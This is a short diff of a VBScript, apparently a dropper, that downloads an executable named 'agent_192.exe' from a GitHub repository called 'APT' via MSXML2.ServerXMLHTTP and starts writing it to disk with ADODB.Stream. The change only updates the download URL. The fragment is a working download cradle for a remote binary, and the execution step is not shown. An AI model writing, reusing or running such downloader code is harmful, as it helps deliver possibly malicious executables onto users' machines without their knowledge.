@@ -6,7 +6,7 @@ If Not objFSO.FolderExists(strFolder) Then
 End If
 Set args = WScript.Arguments
 Set oXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-oXMLHTTP.Open "GET", "https://raw.githubusercontent.com/rbkarthick/APT/upload/master/agent_192.exe", 0 
+oXMLHTTP.Open "GET", "https://github.com/rbkarthick/APT/raw/master/agent_192.exe", 0 
 oXMLHTTP.Send
 Set oADOStream = CreateObject("ADODB" & ".Stream")
 oADOStream.Mode = 3
